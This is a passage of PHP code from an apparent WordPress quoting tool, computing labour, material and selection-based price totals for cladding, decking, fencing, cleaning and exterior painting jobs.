                                $height_total = $range_price_total;

                        }
                }

                $wall_area = ( $width + $width + $length + $length ) * $height_total;

                $current_cladding = $data['current'];
                $current_cladding_total = 0;
                foreach($current_cladding_data as $temp) {
                        if( $temp['title'] == $current_cladding ) {

                                if($current_cladding_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$current_cladding_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $current_cladding_total = ( $labour_and_material_total ) * $wall_area;
                                }
                                elseif($current_cladding_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $current_cladding_total = $range_price_total * $wall_area;
                                }

                        }
                }
                // ADD CURRENT CLADDING TOTAL TO $TOTAL
                $total = $total + $current_cladding_total;

                $proposed_cladding = $data['proposed'];
                $proposed_cladding_total = 0;
                foreach($current_cladding_data as $temp) {
                        if( $temp['title'] == $proposed_cladding ) {

                                if($proposed_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$proposed_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $proposed_cladding_total = ( $labour_and_material_total ) * $wall_area;
                                }
                                elseif($proposed_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $proposed_cladding_total = $range_price_total * $wall_area;
                                }

                        }
                }
                // ADD PROPOSED CLADDING TOTAL TO $TOTAL
                $total = $total + $proposed_cladding_total;

                $paint_ceilings = $data['paint'];
                $paint_ceilings_total = 0;
                if($paint_ceilings == 'Yes') {
                        foreach($painted_data as $temp) {
                                if($temp['title'] == 'Yes') {

                                        if($paint_ceilings_prices == 'labour') {
                                                $labour_price_total = $temp['labour'];
                                                $labour_price_total_value = 0;
                                                $material_price_total = $temp['material'];
                                                $material_price_total_value = 0;
                                                foreach($labour_price_total as $l) {
                                                        $labour_price_total_value = $labour_price_total_value + $l['price'];
                                                }
                                                foreach($material_price_total as $m) {
                                                        $material_price_total_value = $material_price_total_value + $m['price'];
                                                }
                                                $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                                // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                                $selectionPrice = 0;
                                                $selectionPrice = go_calculate_selection($selectionsData,$painted_title,$temp['title']);
                                                $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                                // *** END ***

                                                $paint_ceilings_total = $labour_and_material_total * $wall_area;
                                        }
                                        elseif($paint_ceilings_prices == 'range') {
                                                $range_price_total = $temp['range_price'];
                                                $paint_ceilings_total = $range_price_total * $wall_area;
                                        }

                                }
                        }

                        // ADD PAINT CEILINGS TOTAL TO TOTAL
                        $total = $total + $paint_ceilings_total;

                }

                $extra = $data['joinery'];
                $extra_total = 0;
                foreach($windows_and_doors_data as $temp) {
                        if( in_array($temp['title'],$extra) ) {

                                // let's count QNT of each extra field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $extra_count = $data['' . $count_field_title . ''];
                                if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
                                       $extra_count = 1;
                                }

                                if($windows_and_doors_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$windows_and_doors_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $extra_total = $extra_total +  ( $labour_and_material_total * $extra_count);
                                }
                                elseif($windows_and_doors_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $extra_total = $extra_total + ( $range_price_total * $extra_count);
                                }

                        }

                }
                // ADD windows and doors TOTAL TO $TOTAL
                $total = $total + $extra_total;

        }

        // V2 formulas for Decking template
        if(get_the_title($t) == 'Decking') {

                $all_scope_data = get_field('quote_fields',$t);

                $width = $data['area_width'];
                $length = $data['area_length'];


                $floor_area = $width * $length;
                $outer_length = $width + $width + $length + $length;
                $pergola_area = $p_width * $p_length;

                foreach($all_scope_data as $d) {
                        if($d['slug'] == 'height') {
                                $height_data = $d['fields'];
                        }
                        if($d['slug'] == 'foundation') {
                                $foundation_title = $d['title'];
                                $foundation_prices = $d['type_of_price'];
                                $foundation_data = $d['fields'];
                        }
                        if($d['slug'] == 'deck') {
                                $decking_title = $d['title'];
                                $decking_prices = $d['type_of_price'];
                                $decking_data = $d['fields'];
                        }
									      if($d['slug'] == 'finish') {
                                $finish_title = $d['title'];
                                $finish_prices = $d['type_of_price'];
                                $finish_data = $d['fields'];
                        }
                        if($d['slug'] == 'ballustrade') {
                                $ballustrade_title = $d['title'];
                                $ballustrade_prices = $d['type_of_price'];
                                $ballustrade_data = $d['fields'];
                        }
                        if($d['slug'] == 'extras') {
                                $extra_title = $d['title'];
                                $extra_prices = $d['type_of_price'];
                                $extra_data = $d['fields'];
                        }
                }

                $height = $data['height'];
                $height_total = 0;
                foreach($height_data as $temp) {
                        if( $temp['title'] == $height ) {

                                $range_price_total = $temp['range_price'];
                                $height_total = $range_price_total;

                        }
                }

                $foundation = $data['foundation'];
                $foundation_total = 0;
                foreach($foundation_data as $temp) {
                        if( $temp['title'] == $foundation ) {

                                if($foundation_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $material_price_total_value + $labour_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$foundation_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $foundation_total = $labour_and_material_total;
                                }
                                elseif($foundation_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $foundation_total = $range_price_total;
                                }

                        }
                }

                $decking = $data['deck'];
                $decking_total = 0;
                foreach($decking_data as $temp) {
                        if( $temp['title'] == $decking ) {

                                if($decking_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $material_price_total_value + $labour_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$decking_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $decking_total = $labour_and_material_total;
                                }
                                elseif($decking_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $decking_total = $range_price_total;
                                }

                        }
                }

					      $finish = $data['finish'];
                $finish_total = 0;
                foreach($finish_data as $temp) {
                        if( $temp['title'] == $finish ) {

                                if($finish_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $material_price_total_value + $labour_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$finish_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $finish_total = $finish_total + ( $labour_and_material_total * $floor_area );
                                }
                                elseif($finish_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $finish_total = $range_price_total;
                                }

                        }
                }

                $ballustrade = $data['ballustrade'];
                $ballustrade_total = 0;
                foreach($ballustrade_data as $temp) {
                        if( in_array($temp['title'],$ballustrade) ) {

                                // let's count QNT of each ballustrade field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $ballustrade_count = $data['' . $count_field_title . ''];
                                if($ballustrade_count == NULL || $ballustrade_count == '' || empty($ballustrade_count)) {
                                       $ballustrade_count = 1;
                                }

                                if($ballustrade_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$ballustrade_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $ballustrade_total = $ballustrade_total +  ( $labour_and_material_total * $ballustrade_count);
                                }
                                elseif($ballustrade_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $ballustrade_total = $ballustrade_total + ( $range_price_total * $ballustrade_count);
                                }

                        }

                }


                $extra = $data['extras'];
                $extra_total = 0;
                foreach($extra_data as $temp) {
                        if( in_array($temp['title'],$extra) ) {

                                // let's count QNT of each extra field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $extra_count = $data['' . $count_field_title . ''];
                                if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
                                       $extra_count = 1;
                                }

                                if($extra_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $material_price_total_value + $labour_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$extra_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $extra_total = $extra_total +  ( $labour_and_material_total * $extra_count);
                                }
                                elseif($extra_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $extra_total = $extra_total + ( $range_price_total * $extra_count);
                                }

                        }

                }


                $deck_price_sub = $floor_area * ($foundation_total + $decking_total);
                $deck_price_sub_percent = $height_total * $deck_price_sub / 100;
                $decking_total_summ = $deck_price_sub + $deck_price_sub_percent + $ballustrade_total + $extra_total + $finish_total;
                $total = $total + $decking_total_summ;

        }

        // V2 formulas for Fencing template
        if(get_the_title($t) == 'Fencing') {

                $all_scope_data = get_field('quote_fields',$t);

                $length = $data['length_width'];

                foreach($all_scope_data as $d) {
                        if($d['slug'] == 'height') {
                                $height_data = $d['fields'];
                        }
                        if($d['slug'] == 'type') {
                                $fence_type_title = $d['title'];
                                $fence_type_prices = $d['type_of_price'];
                                $fence_type_data = $d['fields'];
                        }
                        if($d['slug'] == 'painted') {
                                $painted_title = $d['title'];
                                $painted_prices = $d['type_of_price'];
                                $painted_data = $d['fields'];
                        }
                }

                $height = $data['height'];
                $height_total = 0;
                foreach($height_data as $temp) {
                        if( $temp['title'] == $height ) {

                                $range_price_total = $temp['range_price'];
                                $height_total = $range_price_total;

                        }
                }

                $area = $length * $height_total;

                $fence_type = $data['type'];
                $fence_type_total = 0;
                foreach($fence_type_data as $temp) {
                        if( in_array($temp['title'],$fence_type) || $temp['title'] == $fence_type ) {

                                if($fence_type_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $material_price_total_value + $labour_price_total_value;

                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = go_calculate_selection($selectionsData,$fence_type_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $fence_type_total = $fence_type_total + ($labour_and_material_total * $length);
                                }
                                elseif($fence_type_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $fence_type_total = $fence_type_total + ($range_price_total * $length);
                                }

                        }
                }

                $painted = $data['painted'];
                $painted_total = 0;
                foreach($painted_data as $temp) {
                        if( $temp['title'] == $painted ) {

                                if($painted_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }

                                        $labour_and_material_total = $material_price_total_value + $labour_price_total_value;

                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = go_calculate_selection($selectionsData,$painted_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;

                                        $painted_total = $labour_and_material_total + ($range_price_total * $area);
                                }
                                elseif($painted_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $painted_total = $painted_total + ($range_price_total * $area);
                                }

                        }
                }

								$fence_type_total = $fence_type_total + ($fence_type_total * $height_total / 100);
                $fencing_total = $fence_type_total + $painted_total;
                $total = $total + $fencing_total;

        }

	 // V2 formulas for Painting Exterior template
        if(get_the_title($t) == 'Cleaning') {

                $all_scope_data = get_field('quote_fields',$t);
             
                foreach($all_scope_data as $d) {
                       if($d['slug'] == 'carpet') {
                                $carpet_title = $d['title'];
                                $carpet_prices = $d['type_of_price'];
                                $carpet_data = $d['fields'];
                        }			      		
                       if($d['slug'] == 'general_clean') {
                                $general_clean_title = $d['title'];
                                $general_clean_prices = $d['type_of_price'];
                                $general_clean_data = $d['fields'];
                        }
                        if($d['slug'] == 'extras') {
                                $extras_title = $d['title'];
                                $extras_prices = $d['type_of_price'];
                                $extras_data = $d['fields'];
                        }
                        if($d['slug'] == 'pressure') {
                                $pressure_title = $d['title'];
                                $pressure_prices = $d['type_of_price'];
                                $pressure_data = $d['fields'];
                        }
									      if($d['slug'] == 'levels') {
                                $levels_title = $d['title'];
                                $levels_prices = $d['type_of_price'];
                                $levels_data = $d['fields'];
                        }

                }


              
					    

                $carpet = $data['carpet'];
                $carpet_total = 0;
                foreach($carpet_data as $temp) {
                        if( ($temp['title'] == $carpet) || in_array($temp['title'],$carpet) ) {

													 // let's count QNT of each extra field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $extra_count = $data['' . $count_field_title . ''];
                                if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
                                       $extra_count = 1;
                                }
													
                                if($carpet_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$carpet_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $carpet_total = $carpet_total + $labour_and_material_total;
                                }
                                elseif($carpet_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $carpet_total = $carpet_total + ( $range_price_total * $extra_count );
                                }

                        }
                }


                 $general_clean = $data['general_clean'];
                $general_clean_total = 0;
                foreach($general_clean_data as $temp) {
                        if( ($temp['title'] == $general_clean) || in_array($temp['title'],$general_clean) ) {

													 // let's count QNT of each extra field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $extra_count = $data['' . $count_field_title . ''];
                                if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
                                       $extra_count = 1;
                                }
													
                                if($general_clean_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$general_clean_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $general_clean_total = $general_clean_total + $labour_and_material_total;
                                }
                                elseif($general_clean_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $general_clean_total = $general_clean_total + ( $range_price_total * $extra_count );
                                }

                        }
                }


                $extras = $data['extras'];
                $extras_total = 0;
                foreach($extras_data as $temp) {
                        if( ($temp['title'] == $extras) || in_array($temp['title'],$extras) ) {

													 // let's count QNT of each extra field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $extra_count = $data['' . $count_field_title . ''];
                                if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
                                       $extra_count = 1;
                                } 
													
                                if($extras_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$extras_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $extras_total = $extras_total + $labour_and_material_total;
                                }
                                elseif($extras_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $extras_total = $extras_total + ( $range_price_total * $extra_count );
                                }

                        }
                }


					      $pressure = $data['pressure'];
                $pressure_total = 0;
                foreach($pressure_data as $temp) {
                        if( ($temp['title'] == $pressure) || in_array($temp['title'],$pressure) ) {

													  // let's count QNT of each extra field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $extra_count = $data['' . $count_field_title . ''];
                                if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
                                       $extra_count = 1;
                                }

                                if($pressure_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$pressure_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $pressure_total = $pressure_total + ( $labour_and_material_total * $extra_count );
                                }
                                elseif($pressure_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $pressure_total = $pressure_total + ( $range_price_total * $extra_count );
                                }

                        }
                }


					        $levels = $data['levels'];
                $levels_total = 0;
                foreach($levels_data as $temp) {
                        if( $temp['title'] == $levels ) {

                                if($levels_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$levels_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $levels_total = $levels_total + $labour_and_material_total;
                                }
                                elseif($levels_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $levels_total = $levels_total + $range_price_total;
                                }

                        }
                }


					
                $inside_total = $carpet_total + $general_clean_total + $extras_total;
					      $ouside_total = $pressure_total + $levels_total;
                $cleaning_total = $inside_total + $outside_total;
                $total = $total + $cleaning_total;

        }

	
        // V2 formulas for Painting Exterior template
        if(get_the_title($t) == 'Exterior') {

                $all_scope_data = get_field('quote_fields',$t);

                $width = $data['area_width'];
                $height = $data['area_height'];

                foreach($all_scope_data as $d) {
                        if($d['slug'] == 'current') {
                                $current_title = $d['title'];
                                $current_prices = $d['type_of_price'];
                                $current_data = $d['fields'];
                        }
							      		if($d['slug'] == 'level') {
                                                $level_title = $d['title'];
                                                $level_prices = $d['type_of_price'];
                                                $level_data = $d['fields'];
                                        }
                        if($d['slug'] == 'joinerys') {
                                $windows_and_doors_title = $d['title'];
                                $windows_and_doors_prices = $d['type_of_price'];
                                $windows_and_doors_data = $d['fields'];
                        }
                        if($d['slug'] == 'seal') {
                                $seal_title = $d['title'];
                                $seal_prices = $d['type_of_price'];
                                $seal_data = $d['fields'];
                        }
                        if($d['slug'] == 'trim') {
                                $trim_title = $d['title'];
                                $trim_prices = $d['type_of_price'];
                                $trim_data = $d['fields'];
                        }
                        if($d['slug'] == 'roof') {
                                $roof_title = $d['title'];
                                $roof_prices = $d['type_of_price'];
                                $roof_data = $d['fields'];
                        }
                        if($d['slug'] == 'extras') {
                                $extras_title = $d['title'];
                                $extras_prices = $d['type_of_price'];
                                $extras_data = $d['fields'];
                        }
                        if($d['slug'] == 'paint') {
                                $paint_title = $d['title'];
                                $paint_prices = $d['type_of_price'];
                                $paint_data = $d['fields'];
                        }

                }


                $wall_area = $width * $height;
                $outer_length = $width;

                $current = $data['current'];
                $current_total = 0;
                foreach($current_data as $temp) {
                        if( $temp['title'] == $current ) {

                                if($current_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$current_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $current_total = $current_total + ($labour_and_material_total * $wall_area);
                                }
                                elseif($current_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $current_total = $current_total + ($range_price_total * $wall_area);
                                }

                        }
                }


					      $seal = $data['seal'];
                $seal_total = 0;
                foreach($seal_data as $temp) {
                        if( $temp['title'] == $seal ) {

                                if($seal_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$seal_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $seal_total = $seal_total + ($labour_and_material_total * $wall_area);
                                }
                                elseif($seal_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $seal_total = $seal_total + ($range_price_total * $wall_area);
                                }

                        }
                }


                $windows_and_doors = $data['joinerys'];
                $windows_and_doors_total = 0;
                foreach($windows_and_doors_data as $temp) {
                        if( in_array($temp['title'],$windows_and_doors) ) {

                                // let's count QNT of each extra field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $extra_count = $data['' . $count_field_title . ''];
                                if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
                                       $extra_count = 1;
                                }

                                if($windows_and_doors_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$windows_and_doors_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $windows_and_doors_total = $windows_and_doors_total + ( $labour_and_material_total * $extra_count);
                                }
                                elseif($windows_and_doors_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $windows_and_doors_total = $windows_and_doors_total + ( $range_price_total * $extra_count);
                                }

                        }

                }

                $trim = $data['trim'];
                $trim_total = 0;
                foreach($trim_data as $temp) {
                        if( ($temp['title'] == $trim) || in_array($temp['title'],$trim) ) {

                                if($trim_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$trim_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $trim_total = $trim_total + ($labour_and_material_total * $outer_length);
